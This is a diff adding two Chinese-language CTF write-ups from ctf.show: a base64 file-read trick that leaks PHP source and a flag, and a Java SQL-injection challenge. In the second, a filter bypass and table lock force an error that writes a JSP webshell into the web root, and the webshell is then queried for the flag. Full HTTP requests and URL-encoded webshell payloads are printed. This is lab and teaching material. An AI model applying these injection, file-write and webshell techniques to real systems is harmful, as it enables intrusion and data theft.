@@ -5582,6 +5582,320 @@ code=<script language="php">system('cat /f1agaaa');</script>
 
 ------
 
+### easy_signin
+
+进入靶机后，看到一张滑稽表情包。靶机请求的文件是`/?img=ZmFjZS5wbmc=`。
+
+用`Python`进行`base64`解码，得到`face.png`。有趣，再将`index.php`进行`base64`编码。
+
+```python
+>>> from base64 import *
+>>> b64decode('ZmFjZS5wbmc=')
+b'face.png'
+>>> b64encode(b'index.php')
+b'aW5kZXgucGhw'
+```
+
+访问`/?img=aW5kZXgucGhw`尝试查看`index.php`，这张破损的图片是：
+
+```
+<img src='data:image/png;base64,PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezNhOWEyYTA2LTFlNmUtNDFmMS05NDU0LTk2N2E1MGIyODEyZH0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'/>
+```
+
+直接在`cmd`用`php -r "var_dump(base64_decode())"`对其进行`base64`解码，可以看到`flag`变量。
+
+```php
+C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAKLyoKIyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBAQXV0aG9yOiBoMXhhCiMgQERhdGU6ICAgMjAyMy0wMy0yNyAxMDozMDozMAojIEBMYXN0IE1vZGlmaWVkIGJ5OiAgIGgxeGEKIyBATGFzdCBNb2RpZmllZCB0aW1lOiAyMDIzLTAzLTI4IDEyOjE1OjMzCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQojIEBsaW5rOiBodHRwczovL2N0ZmVyLmNvbQoKKi8KCiRpbWFnZT0kX0dFVFsnaW1nJ107CgokZmxhZyA9ICJjdGZzaG93ezNhOWEyYTA2LTFlNmUtNDFmMS05NDU0LTk2N2E1MGIyODEyZH0iOwppZihpc3NldCgkaW1hZ2UpKXsKCSRpbWFnZSA9IGJhc2U2NF9kZWNvZGUoJGltYWdlKTsKCSRkYXRhID0gYmFzZTY0X2VuY29kZShmaWxlX2dldF9jb250ZW50cygkaW1hZ2UpKTsKCWVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL3BuZztiYXNlNjQsJGRhdGEnLz4iOwp9ZWxzZXsKCSRpbWFnZSA9IGJhc2U2NF9lbmNvZGUoImZhY2UucG5nIik7CgloZWFkZXIoImxvY2F0aW9uOi8/aW1nPSIuJGltYWdlKTsKfQoKCgoK'));"
+string(525) "<?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2023-03-27 10:30:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2023-03-28 12:15:33
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+$image=$_GET['img'];
+
+$flag = "ctfshow{3a9a2a06-1e6e-41f1-9454-967a50b2812d}";
+if(isset($image)){
+        $image = base64_decode($image);
+        $data = base64_encode(file_get_contents($image));
+        echo "<img src='data:image/png;base64,$data'/>";
+}else{
+        $image = base64_encode("face.png");
+        header("location:/?img=".$image);
+}
+
+
+
+
+"
+```
+
+提交`ctfshow{3a9a2a06-1e6e-41f1-9454-967a50b2812d}`即可。
+
+------
+
+### easy_sql
+
+题目给了附近`web4.zip`，解压缩后发现一系列`Java`的`.class`文件，用`JADX`打开文件夹。
+
+在`com.ctfshow.controller`包中发现`AppController.class`有关键代码片段。
+
+```java
+/* loaded from: AppController.class */
+public class AppController {
+    @RequestMapping(value = {"/check"}, method = {RequestMethod.POST}, produces = {"text/html;charset=utf-8"})
+    @ResponseBody
+    public String auth(@RequestParam String username, @RequestParam String password, HttpServletRequest request) throws SQLException {
+        String message = "社工库未查询到泄露记录，你的账号是安全的。";
+        if (SafeUtil.sql_check(username) || SafeUtil.sql_check(password)) {
+            return "stop sql inject!";
+        }
+        try {
+            String sql = "select username,password from app_user where username ='" + username + "' and password ='" + password + "' ;";
+            ResultSet resultSet = DbUtil.getInstance().query(sql);
+            if (null != resultSet) {
+                if (resultSet.next()) {
+                    message = "您的QQ账号密码已经泄露，请立即修改密码";
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            message = "数据查询出错";
+        }
+        insertQueryLog(username, password);
+        return message;
+    }
+......
+```
+
+很明显`auth()`函数中有一条`SQL`语句可能存在`SQL`注入点，但这还有个`SafeUtil.sql_check()`函数。
+
+```java
+/* loaded from: SafeUtil.class */
+public class SafeUtil {
+    public static boolean sql_check(String sql) {
+        String sql2 = sql.toLowerCase(Locale.ROOT);
+        String[] ban = {"'", "file", "information", "mysql", "from", "update", "delete", "select", ",", "union", "sleep", "("};
+        for (String s : ban) {
+            if (sql2.contains(s)) {
+                return true;
+            }
+        }
+        return false;
+    }
+}
+```
+
+过滤了单引号`'`和一系列`SQL`关键字，但是我们能用转义绕过单引号过滤。
+
+在配置文件`config.properties`中有一句`allowMultiQueries=true`，而且没过滤分号，所以很明显存在堆叠注入。
+
+```
+url=jdbc:mysql://127.0.0.1:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC
+db_username=root
+db_password=root
+```
+
+再看看`auth()`函数中的这个`insertQueryLog(username,password)`。
+
+```java
+private int insertQueryLog(String username, String password) throws SQLException {
+    Connection connection = DbUtil.getConnection();
+    int count = 0;
+    try {
+        connection.setAutoCommit(false);
+        PreparedStatement preparedStatement = connection.prepareStatement("insert into app_query_log(username,password) values(?,?);");
+        preparedStatement.setQueryTimeout(3);
+        preparedStatement.setString(1, username);
+        preparedStatement.setString(2, password);
+        count = preparedStatement.executeUpdate();
+        connection.commit();
+    } catch (SQLException e) {
+        LogUtil.save(username, password);
+        e.printStackTrace();
+    }
+    return count;
+}
+```
+
+其中有一句`LogUtil.save()`，继续跟进看看。
+
+```java
+/* loaded from: LogUtil.class */
+public class LogUtil {
+    public static void save(String username, String password) {
+        FileUtil.SaveFileAs(username, password);
+    }
+}
+```
+
+继续跟进`FileUtil.SaveFileAs()`。
+
+```java
+/* loaded from: FileUtil.class */
+public static boolean SaveFileAs(String content, String path) {
+    FileWriter fw = null;
+    try {
+        try {
+            fw = new FileWriter(new File(path), false);
+            if (content != null) {
+                fw.write(content);
+            }
+            if (fw == null) {
+                return true;
+            }
+            try {
+                fw.flush();
+                fw.close();
+                return true;
+            } catch (IOException e) {
+                e.printStackTrace();
+                return true;
+            }
+        } catch (IOException e2) {
+            e2.printStackTrace();
+            if (fw != null) {
+                try {
+                    fw.flush();
+                    fw.close();
+                } catch (IOException e3) {
+                    e3.printStackTrace();
+                }
+            }
+            return false;
+        }
+    } catch (Throwable th) {
+        if (fw != null) {
+            try {
+                fw.flush();
+                fw.close();
+            } catch (IOException e4) {
+                e4.printStackTrace();
+            }
+        }
+        throw th;
+    }
+}
+```
+
+也就是说，这里其实有一个保存文件的功能，如果我们让上面的`insertQueryLog()`报错，就会进入`catch (SQLException e)`，然后通过`LogUtil.save()`保存文件，并且`username`为内容，`password`为文件名，但是这里过滤了`(`，我们必须做到既不用括号来`SQL`注入，还得让`SQL`语句报错。回到那条`SQL`语句。
+
+```java
+String sql = "insert into app_query_log(username,password) values(?,?);";
+```
+
+有三个报错方法：
+
+- 修改app_query_log表，让username为主键，重复插入时会报异常。
+- 删除app_query_log表，找不到要插入的表，报异常。
+- 锁表。
+
+我们这里利用锁表进行操作，禁止更新的情况下，插入会报异常。
+
+```
+username=a\&password=;flush tables with read lock;%23
+```
+
+用`Burp Suite`抓包构造`POST`请求并发送。
+
+```
+POST /app/check HTTP/1.1
+Host: f3c203f5-16a3-4eb6-ac0b-5b706f62320f.challenge.ctf.show
+Content-Length: 53
+Cache-Control: max-age=0
+Origin: http://f3c203f5-16a3-4eb6-ac0b-5b706f62320f.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=07EF240B6426CB9ABB9319B0C1729003
+Connection: keep-alive
+
+username=a\&password=;flush tables with read lock;%23
+```
+
+可以在`Response`中看到`HTTP/1.1 200 OK`，社工库未查询到泄露记录，你的账号是安全的。
+
+写入`.jsp`文件，由于过滤了括号，这时候只能使用`jstl`标签来执行，完美避开了括号：
+
+```java
+<%@ page language="java" contentType="text/html; charset=UTF-8"
+    pageEncoding="UTF-8"%>
+<%@ taglib uri="http://java.sun.com/jsp/jstl/sql" prefix="sql"%>
+<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
+<%@ page isELIgnored="false" %>
+<sql:setDataSource var="test" driver="${param.driver}"
+        url="${param.url}" user="root" password="root" />
+   <sql:query dataSource="${test}" var="result">
+        ${param.sql}
+    </sql:query>
+
+<table border="1" width="100%">
+        <tr>
+            <th>ctfshow</th>
+        </tr>
+        <c:forEach var="row" items="${result.rows}">
+            <tr>
+                <td><c:out value="${row.t}" /></td>
+            </tr>
+        </c:forEach>
+    </table>
+```
+
+`POST`数据如下：
+
+```
+username=%3C%25%40%20page%20language%3D%22java%22%20contentType%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%0A%20%20%20%20pageEncoding%3D%22UTF-8%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fsql%22%20prefix%3D%22sql%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fcore%22%20prefix%3D%22c%22%25%3E%0A%3C%25%40%20page%20isELIgnored%3D%22false%22%20%25%3E%0A%3Csql%3AsetDataSource%20var%3D%22test%22%20driver%3D%22%24%7Bparam.driver%7D%22%0A%20%20%20%20%20%20%20%20url%3D%22%24%7Bparam.url%7D%22%20user%3D%22root%22%20password%3D%22root%22%20%2F%3E%0A%20%20%20%3Csql%3Aquery%20dataSource%3D%22%24%7Btest%7D%22%20var%3D%22result%22%3E%0A%20%20%20%20%20%20%20%20%24%7Bparam.sql%7D%0A%20%20%20%20%3C%2Fsql%3Aquery%3E%0A%0A%0A%0A%3Ctable%20border%3D%221%22%20width%3D%22100%25%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3Et%3C%2Fth%3E%0A%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3Cc%3AforEach%20var%3D%22row%22%20items%3D%22%24%7Bresult.rows%7D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Cc%3Aout%20value%3D%22%24%7Brow.t%7D%22%20%2F%3E%3C%2Ftd%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fc%3AforEach%3E%0A%20%20%20%20%3C%2Ftable%3E&password=../webapps/ROOT/1.jsp
+```
+
+用`Burp Suite`抓包构造`POST`请求并发送，上传`.jsp`小木马。
+
+```
+POST /app/check HTTP/1.1
+Host: f3c203f5-16a3-4eb6-ac0b-5b706f62320f.challenge.ctf.show
+Content-Length: 1401
+Cache-Control: max-age=0
+Origin: http://f3c203f5-16a3-4eb6-ac0b-5b706f62320f.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=07EF240B6426CB9ABB9319B0C1729003
+Connection: keep-alive
+
+username=%3C%25%40%20page%20language%3D%22java%22%20contentType%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%0A%20%20%20%20pageEncoding%3D%22UTF-8%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fsql%22%20prefix%3D%22sql%22%25%3E%0A%3C%25%40%20taglib%20uri%3D%22http%3A%2F%2Fjava.sun.com%2Fjsp%2Fjstl%2Fcore%22%20prefix%3D%22c%22%25%3E%0A%3C%25%40%20page%20isELIgnored%3D%22false%22%20%25%3E%0A%3Csql%3AsetDataSource%20var%3D%22test%22%20driver%3D%22%24%7Bparam.driver%7D%22%0A%20%20%20%20%20%20%20%20url%3D%22%24%7Bparam.url%7D%22%20user%3D%22root%22%20password%3D%22root%22%20%2F%3E%0A%20%20%20%3Csql%3Aquery%20dataSource%3D%22%24%7Btest%7D%22%20var%3D%22result%22%3E%0A%20%20%20%20%20%20%20%20%24%7Bparam.sql%7D%0A%20%20%20%20%3C%2Fsql%3Aquery%3E%0A%0A%0A%0A%3Ctable%20border%3D%221%22%20width%3D%22100%25%22%3E%0A%20%20%20%20%20%20%20%20%3Ctr%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3Et%3C%2Fth%3E%0A%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3Cc%3AforEach%20var%3D%22row%22%20items%3D%22%24%7Bresult.rows%7D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ctr%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Cc%3Aout%20value%3D%22%24%7Brow.t%7D%22%20%2F%3E%3C%2Ftd%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ftr%3E%0A%20%20%20%20%20%20%20%20%3C%2Fc%3AforEach%3E%0A%20%20%20%20%3C%2Ftable%3E&password=../webapps/ROOT/1.jsp
+```
+
+可以在`Response`中看到`HTTP/1.1 200 OK`，社工库未查询到泄露记录，你的账号是安全的。
+
+查询数据库中所有表名。
+
+```
+/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select group_concat(table_name) as t from information_schema.tables where table_schema="app";
+```
+
+> app_flag_xxoo_non0, app_user
+
+接着用`SQL`语句查询`flag`。
+
+```
+/1.jsp?driver=com.mysql.jdbc.Driver&url=jdbc:mysql://localhost:3306/app?characterEncoding=utf-8&useSSL=false&&autoReconnect=true&allowMultiQueries=true&serverTimezone=UTC&sql=select f1ag as t from app_flag_xxoo_non0 union select 1;
+```
+
+提交`ctfshow{fec31c70-ced1-4941-a29a-ccc9234ee725}`即可
+
+------
+
 ### 新春欢乐赛热身
 
 靶机的代码如下：
